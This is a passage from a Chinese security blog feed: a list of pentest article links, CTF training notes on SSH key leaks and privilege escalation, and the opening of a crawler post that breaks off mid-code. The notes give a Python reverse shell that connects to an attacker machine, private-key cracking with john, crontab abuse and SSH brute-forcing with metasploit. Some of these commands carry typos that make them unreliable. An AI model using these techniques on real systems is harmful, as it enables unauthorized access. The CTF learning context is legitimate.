    <link href="https://www.mad-coding.cn/2019/09/03/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86/"/>
    <id>https://www.mad-coding.cn/2019/09/03/优秀文章整理/</id>
    <published>2019-09-03T02:50:37.000Z</published>
    <updated>2019-09-19T06:47:41.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习的过程中，会经常浏览一些优质的公众号和论坛文章，但是可能看看以后就过去了，下次在想找的时候就找不到了，为了解决这个问题，我决定自己将一些自己决定还不错的问题记录下来。方便下次查看，同时也能方便他人查看。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="1-1-记一次另类突破CDN的完全渗透"><a href="#1-1-记一次另类突破CDN的完全渗透" class="headerlink" title="1.1 记一次另类突破CDN的完全渗透"></a>1.1 记一次另类突破CDN的完全渗透</h2><p><a href="http://www.recorday.cn/index.php/2018/10/17/pentest_bypass_cdn/" target="_blank" rel="noopener">http://www.recorday.cn/index.php/2018/10/17/pentest_bypass_cdn/</a></p><h2 id="1-2-Android-APK脱壳–腾讯乐固、360加固一键脱壳"><a href="#1-2-Android-APK脱壳–腾讯乐固、360加固一键脱壳" class="headerlink" title="1.2 Android APK脱壳–腾讯乐固、360加固一键脱壳"></a>1.2 Android APK脱壳–腾讯乐固、360加固一键脱壳</h2><p><a href="https://www.jianshu.com/p/138c9de2c987" target="_blank" rel="noopener">https://www.jianshu.com/p/138c9de2c987</a></p><h2 id="1-3-反弹shell的学习总结-01"><a href="#1-3-反弹shell的学习总结-01" class="headerlink" title="1.3 反弹shell的学习总结-01"></a>1.3 反弹shell的学习总结-01</h2><p><a href="https://mp.weixin.qq.com/s/-citnkfwGai7KQCIp9G99w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-citnkfwGai7KQCIp9G99w</a></p><h2 id="1-4-反弹shell的学习总结-02"><a href="#1-4-反弹shell的学习总结-02" class="headerlink" title="1.4 反弹shell的学习总结-02"></a>1.4 反弹shell的学习总结-02</h2><p><a href="https://mp.weixin.qq.com/s/S9Luvf2Drj4aDqKWUJjTwg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/S9Luvf2Drj4aDqKWUJjTwg</a></p><h2 id="1-5-使用BurpSuite宏获取CSRF-TOKEN"><a href="#1-5-使用BurpSuite宏获取CSRF-TOKEN" class="headerlink" title="1.5 使用BurpSuite宏获取CSRF TOKEN"></a>1.5 使用BurpSuite宏获取CSRF TOKEN</h2><p><a href="https://ryaninf.github.io/2019/07/15/使用BurpSuite宏获取CSRF-TOKEN/" target="_blank" rel="noopener">https://ryaninf.github.io/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/</a></p><h2 id="1-6-谈谈php一句话木马的免杀"><a href="#1-6-谈谈php一句话木马的免杀" class="headerlink" title="1.6 谈谈php一句话木马的免杀"></a>1.6 谈谈php一句话木马的免杀</h2><p><a href="https://saucer-man.com/information_security/248.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/248.html</a></p><h2 id="1-7-Web安全攻防-01"><a href="#1-7-Web安全攻防-01" class="headerlink" title="1.7 Web安全攻防:01"></a>1.7 Web安全攻防:01</h2><p><a href="https://blog.csdn.net/qq_41453285/article/details/94888750" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/94888750</a></p><h2 id="1-8-安全大会资料"><a href="#1-8-安全大会资料" class="headerlink" title="1.8 安全大会资料"></a>1.8 安全大会资料</h2><p><a href="https://www.hackinn.com/index.php/archives/492/" target="_blank" rel="noopener">https://www.hackinn.com/index.php/archives/492/</a></p><h2 id="1-9-个人年度总结及AWD线下赛复盘"><a href="#1-9-个人年度总结及AWD线下赛复盘" class="headerlink" title="1.9 个人年度总结及AWD线下赛复盘"></a>1.9 个人年度总结及AWD线下赛复盘</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484891&amp;idx=1&amp;sn=c767bb774c3817ebfccdbb9bdcec4255&amp;chksm=fc974ccacbe0c5dc7018a58ab7cad811b1c0fd8b5b63cf8d448eb1848d8ad307cc11f6b52d50&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1568818208564&amp;sharer_shareid=2fb4b0da16cbda243011c5424b7ee1d8&amp;key=5b405373aa09951d5175a541d875b688d014322753c6ad9ceabfaeaa4f0917e3589dbfe9abc1d6134cdcf069c7210c1e316d1237cd15e0ea8b793e2bf4086b7374f664c2de0b79e40f274869759b7679&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=tmZFm2SQBQxsTJpizTvPQ6G11qxs5HdnP9XAuBoHvQgVZOE6cowZMw47%2B2TG3bKU" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484891&amp;idx=1&amp;sn=c767bb774c3817ebfccdbb9bdcec4255&amp;chksm=fc974ccacbe0c5dc7018a58ab7cad811b1c0fd8b5b63cf8d448eb1848d8ad307cc11f6b52d50&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1568818208564&amp;sharer_shareid=2fb4b0da16cbda243011c5424b7ee1d8&amp;key=5b405373aa09951d5175a541d875b688d014322753c6ad9ceabfaeaa4f0917e3589dbfe9abc1d6134cdcf069c7210c1e316d1237cd15e0ea8b793e2bf4086b7374f664c2de0b79e40f274869759b7679&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=tmZFm2SQBQxsTJpizTvPQ6G11qxs5HdnP9XAuBoHvQgVZOE6cowZMw47%2B2TG3bKU</a></p><h2 id="1-10-burpsuite使用技巧"><a href="#1-10-burpsuite使用技巧" class="headerlink" title="1.10 burpsuite使用技巧"></a>1.10 burpsuite使用技巧</h2><p><a href="https://www.cnblogs.com/wanghaihong200/p/8727450.html" target="_blank" rel="noopener">https://www.cnblogs.com/wanghaihong200/p/8727450.html</a></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在学习的过程中，会经常浏览一些优质的公众号和论坛文章，但是可能看看以后就过去了，下次在想找的时候就找不到了，为了解决这个问题，我决定自己将一些自己决定还不错的问题记录下来。方便下次查看，同时也能方便他人查看。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="优秀文章" scheme="https://www.mad-coding.cn/tags/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTF夺旗培训学习笔记</title>
    <link href="https://www.mad-coding.cn/2019/08/31/CTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mad-coding.cn/2019/08/31/CTF夺旗培训学习笔记/</id>
    <published>2019-08-31T05:25:18.000Z</published>
    <updated>2019-08-31T16:12:38.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司要派我和其他几个同事一起代表公司去参加一场CTF比赛，所以，就在网上找了一些资料来学习，在这里简单做下学习笔记。</p><a id="more"></a><h1 id="0x01-CTF简介"><a href="#0x01-CTF简介" class="headerlink" title="0x01 CTF简介"></a>0x01 CTF简介</h1><p>CTF是一-种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”, 也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式,率先从主办方给出的比赛环境中得到一-串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”</p><p> CTF比赛中涉及内容比较繁杂，我们要利用所有可以利用的方法获得flag。</p><p>CTF比赛中，比赛环境有两种方式：<br>1.给与在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击机，通过攻击机来渗透靶场机器，获取对应的Flag值；（一般情况下给与kali Linux作为攻击机，并且举办方提供计算机）<br>2.给与一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机器，过去对应的flag值。</p><h1 id="0x02-CTF夺旗之SSH私钥泄露"><a href="#0x02-CTF夺旗之SSH私钥泄露" class="headerlink" title="0x02 CTF夺旗之SSH私钥泄露"></a>0x02 CTF夺旗之SSH私钥泄露</h1><h2 id="2-1-前期准备"><a href="#2-1-前期准备" class="headerlink" title="2.1 前期准备"></a>2.1 前期准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r ip/network  # 发现主机</span><br><span class="line">ping ip   #测试连通性</span><br></pre></td></tr></table></figure><h2 id="2-2-信息探测"><a href="#2-2-信息探测" class="headerlink" title="2.2 信息探测"></a>2.2 信息探测</h2><p>每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023端口，在扫描结果中查找特殊端口，针对特殊端口进行探测，尤其对开放大端口的<code>http</code>服务进行排查</p><h2 id="2-4-探测大端口的信息"><a href="#2-4-探测大端口的信息" class="headerlink" title="2.4 探测大端口的信息"></a>2.4 探测大端口的信息</h2><p>对于开放<code>http</code>服务的大端口，可以采取<a href="http://ip:port/的形式访问。" target="_blank" rel="noopener">http://ip:port/的形式访问。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140123.png" class="lozad"></p><p>查看源代码获取对应信息，如果没有falg信息，使用工具探测隐藏页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://ip：port/  #对这个服务的隐藏文件进行探测。</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140139.png" class="lozad"></p><p>发现robots.txt敏感文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140232.png" class="lozad"></p><p>进一步对得到的信息进行探测</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140242.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140310.png" class="lozad"></p><h2 id="2-5-针对隐藏页面分析"><a href="#2-5-针对隐藏页面分析" class="headerlink" title="2.5 针对隐藏页面分析"></a>2.5 针对隐藏页面分析</h2><p>直接使用浏览器访问，查看效果，对应源代码，可能会获取到flag，或者下一步对应的提示；<br>挖掘ssh信息，不断访问获取更多泄露的ssh秘钥信息<br>下载id_ras,和authorized keys</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140621.png" class="lozad"></p><p>查看下载的两个秘钥文件信息,尝试使用秘钥登陆未能成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140635.png" class="lozad"></p><p>给id_rsa赋予读写权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141109.png" class="lozad"></p><blockquote><p>说明：600 == 110 000 000 == rw- — —</p></blockquote><h2 id="2-6-解密ssh秘钥信息"><a href="#2-6-解密ssh秘钥信息" class="headerlink" title="2.6 解密ssh秘钥信息"></a>2.6 解密ssh秘钥信息</h2><p>使用<code>ssh2john</code>将<code>id_isa</code>秘钥信息转换为<code>john</code>可以识别的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_isa</span><br><span class="line">ssh2john id_isa &gt; isacrack</span><br></pre></td></tr></table></figure><p>利用字典解密<code>isacrack</code>信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe -rules isacrack</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141556.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141644.png" class="lozad"></p><p>分析用户名、利用ssh登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_isa 用户名@ssh靶场机器IP地址</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141656.png" class="lozad"></p><p>到这里已经登陆到主机，但是并不是root权限，该如何获取root权限尼？<br>答：深入探测根目录-</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141919.png" class="lozad"></p><p>查找具有root权限的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / - perm -4000 2 &gt; /dev/null</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142006.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142025.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142122.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142142.png" class="lozad"></p><h1 id="0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限"><a href="#0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限" class="headerlink" title="0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)"></a>0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)</h1><h2 id="3-1-ssh协议介绍"><a href="#3-1-ssh协议介绍" class="headerlink" title="3.1 ssh协议介绍"></a>3.1 ssh协议介绍</h2><p>SSH 未Secure Shell的缩写，有IETF的网络小组（Network Working Group）所定制：SSH未建立在应用层基础上的安全协议<br>SSH是目前较为可靠，专门为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中信息泄露的问题。<br>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多个平台，几乎所有UNIX平台，Windows平台以及MAC平台，都可以运行SHH，它是基于TCP 22号端口的服务。</p><h2 id="3-2-SSH协议认证机制"><a href="#3-2-SSH协议认证机制" class="headerlink" title="3.2 SSH协议认证机制"></a>3.2 SSH协议认证机制</h2><ol><li><p>基于口令的安全验证<br>只要你自己知道账号和口令，就可以登陆到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想要的连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人” 这种方式的攻击。</p></li><li><p>基于秘钥的安全验证<br>需要依靠秘钥，也就是你必须为自己穿件一对秘钥，并把公钥放在需要访问的服务器上，如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的私有秘钥进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用秘钥，然后把它和你发送过来的私有秘钥进行比较。如果两个秘钥一致，则验证成功，登陆服务器。</p><blockquote><p>id_rsa就是尼的私钥，而id_rsa.pub则是你的公钥</p></blockquote></li></ol><h2 id="3-3-SSH协议验证机制弱点"><a href="#3-3-SSH协议验证机制弱点" class="headerlink" title="3.3 SSH协议验证机制弱点"></a>3.3 SSH协议验证机制弱点</h2><ol><li><p>基于口令的安全验证<br>基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的一定控制（不一定为root权限）</p></li><li><p>基于秘钥的安全验证<br>通过对主机信息收集，获取到泄露的用户名和对应的秘钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限）</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-4-信息探测"><a href="#3-4-信息探测" class="headerlink" title="3.4 信息探测"></a>3.4 信息探测</h2><p>对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。</p><ol><li><p>探测靶场开放的服务于服务版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场全部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场的操作系统类型与版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151755.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151813.png" class="lozad"></p><h2 id="3-5-分析探测结果"><a href="#3-5-分析探测结果" class="headerlink" title="3.5 分析探测结果"></a>3.5 分析探测结果</h2><p>对于SSH服务的22端口的靶场，首先考虑，</p><ol><li>暴力破解</li><li>私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名）</li></ol><p>对于开放http服务的80端口或者其他端口的靶场,首先考虑:</p><ol><li>通过浏览器访问对应的靶场http服务，如http://靶场ip地址：http服务端口</li><li>使用探测工具对http的目录进行探测，如dirb http://靶场IP地址：http服务端口</li></ol><p><strong>特别注意特殊端口，如8080等大端口号。</strong></p><h2 id="3-6-挖掘敏感信息"><a href="#3-6-挖掘敏感信息" class="headerlink" title="3.6 挖掘敏感信息"></a>3.6 挖掘敏感信息</h2><p>使用浏览器对靶场ip的http服务探测，对页面种展示的内容也要注意，尤其是联系人等信息（有可能就是SSH的用户名信息），递归访问，力争把每一个dirb扫描到的目录页面都访问查看。<br>尤其对robotx.txt，以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必要注意是否可以寻找到SSH私钥信息（id_rsa）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152554.png" class="lozad"></p><p>挖掘到私钥信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152607.png" class="lozad"></p><p>对于某些靶场，也可以使用nikto扫描器来挖掘敏感信息<br>nikto -host 靶场IP地址<br>特别注意config 等特殊敏感文件，要细读扫描的结果，挖掘可以利用的敏感信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152706.png" class="lozad"></p><h2 id="3-7-利用敏感、弱点信息"><a href="#3-7-利用敏感、弱点信息" class="headerlink" title="3.7 利用敏感、弱点信息"></a>3.7 利用敏感、弱点信息</h2><p>对挖掘到的SSH秘钥利用</p><ol><li><p>修改id_rsade 权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure></li><li><p>利用私钥登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa 用户名@靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><strong>注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有机密密码，那么就需要进行对应的破解。</strong></p><p>使用wget远程下载靶机上的文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154141.png" class="lozad"></p><p>将权限修改为600权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154207.png" class="lozad"></p><p>尝试进行远程终端连接</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154235.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154313.png" class="lozad"></p><h2 id="3-8-扩大战果"><a href="#3-8-扩大战果" class="headerlink" title="3.8 扩大战果"></a>3.8 扩大战果</h2><p>登陆服务器之后，我们需要做一下操作：</p><ol><li>查看当前用户whoami</li><li>id 查看当前用户的权限</li><li>查看根目录寻找flag文件,如果是root权限，那么表明这个靶场就被全部拿下，但是如果不时，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd  //查看所有用户的列表</span><br><span class="line">cat /etc/group  //查看用户组</span><br><span class="line">find / -user 用户名  //查看属于某些用户的文件</span><br><span class="line">/tmp   //查看缓存文件目录</span><br></pre></td></tr></table></figure><h2 id="3-9-深入挖掘"><a href="#3-9-深入挖掘" class="headerlink" title="3.9 深入挖掘"></a>3.9 深入挖掘</h2><p>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。<br>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对靶场机器的某个文件。<br>如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。<br>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否有读写权限。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155105.png" class="lozad"></p><h2 id="3-10-反弹shell"><a href="#3-10-反弹shell" class="headerlink" title="3.10 反弹shell"></a>3.10 反弹shell</h2><p>靶场代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#！/usr/bin/python  ##环境变量的书写</span><br><span class="line">import os,subprocess,socket #导入第三方库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socekt(socket.AF_INET,socket.SOCK_STREAM) #创建套接字</span><br><span class="line">s.connect(&quot;攻击机ip地址&quot;,&quot;攻击机监听端口&quot;) #利用套接字连接到攻击机的ip地址，以及攻击机监听的端口号</span><br><span class="line"></span><br><span class="line">#将标准输入输出，以及错误输入输出</span><br><span class="line">os.dup2(s.fileno(),0) </span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure><p>攻击机<code>netcat</code>命令：<code>nc -lpv 未占用端口</code></p><blockquote><p>说明：</p><p>l 表示监听模式</p><p>P 表示端口号</p><p>v 表示返回详细信息</p></blockquote><p>查看占用端口<code>netstat -pantu</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155609.png" class="lozad"></p><h2 id="3-11-背水一战"><a href="#3-11-背水一战" class="headerlink" title="3.11 背水一战"></a>3.11 背水一战</h2><p>万不得已的时候只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等</p><p>利用cupp创建字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jeanphorn/common-password.git</span><br><span class="line">chmod +x cupp.py</span><br><span class="line">./cupp.py -i #以交互的方式创建字典</span><br></pre></td></tr></table></figure><h2 id="3-12-使用metasploit破解SSH"><a href="#3-12-使用metasploit破解SSH" class="headerlink" title="3.12 使用metasploit破解SSH"></a>3.12 使用metasploit破解SSH</h2><p>在终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login)&gt;set rhosts 192.168.1.137</span><br><span class="line">msf auxiliary(ssh_login)&gt;set username hadi</span><br><span class="line">msf auxiliary(ssh_login)&gt;set pass_file hadi.txt</span><br><span class="line">msf auxiliary(ssh_login)&gt;run</span><br></pre></td></tr></table></figure><p>优化会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c “import pty;pty.spqwn(&apos;/bin/bash&apos;)”</span><br><span class="line">su - root</span><br></pre></td></tr></table></figure><blockquote><p>注：暴力破解ssh可以使用超级弱口令工具，支持爆破SSH,FTP,MYSQL等弱口令，Windows版本。</p><p>GitHub地址：<a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231712.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231727.png" class="lozad"></p><h2 id="3-13-获取Flag"><a href="#3-13-获取Flag" class="headerlink" title="3.13 获取Flag"></a>3.13 获取Flag</h2><p>提升到root权限之后，切换目录寻找flag文件。一般情况下，flag文件是在root目录下。<br>cat flag文件名（一般情况 flag.txt）</p><h2 id="3-14-总结"><a href="#3-14-总结" class="headerlink" title="3.14 总结"></a>3.14 总结</h2><p>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登陆靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登陆靶场机。<br>CTF中要特别注意 /tmp数据缓冲目录 以及 /etc/crontab 设置定时之行文件</p><h1 id="0x04-CTF夺旗之SMB信息泄露"><a href="#0x04-CTF夺旗之SMB信息泄露" class="headerlink" title="0x04 CTF夺旗之SMB信息泄露"></a>0x04 CTF夺旗之SMB信息泄露</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;由于公司要派我和其他几个同事一起代表公司去参加一场CTF比赛，所以，就在网上找了一些资料来学习，在这里简单做下学习笔记。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CTF" scheme="https://www.mad-coding.cn/tags/CTF/"/>
    
      <category term="夺旗" scheme="https://www.mad-coding.cn/tags/%E5%A4%BA%E6%97%97/"/>
    
  </entry>
  
  <entry>
    <title>爬取CNNVD上的漏洞预警</title>
    <link href="https://www.mad-coding.cn/2019/08/30/%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
    <id>https://www.mad-coding.cn/2019/08/30/爬取CNNVD上的漏洞预警/</id>
    <published>2019-08-30T07:34:04.000Z</published>
    <updated>2019-08-30T09:12:40.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司原因，本人出差一周，在出差的工作任务有记录CNNVD漏洞预警这项任务，而这样任务简直就是重复造轮子的任务，Ctrl + C ，Ctrl + V ，毫无技术含量不说，还会浪费很多时间，so，我想用爬虫来解决，但是，我又不会写，哈哈，那就百度喽。幸运的是，在百度上找到了爬虫的源码。</p><p><img alt data-src="https://img02.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a458d10c6b7a1d65b27c80fba9904fa9.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-开搞"><a href="#0x01-开搞" class="headerlink" title="0x01 开搞"></a>0x01 开搞</h1><blockquote><p>环境需求：</p><ol><li><p>python 3.x 版本</p></li><li><p>若干第三方模块</p></li></ol></blockquote><h2 id="1-1-python代码"><a href="#1-1-python代码" class="headerlink" title="1.1 python代码"></a>1.1 python代码</h2><p>首先先放出代码，这个代码是在百度上找的，我觉得最好的一个代码了，可以自定义爬行的时间范围和页数，真牛X。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 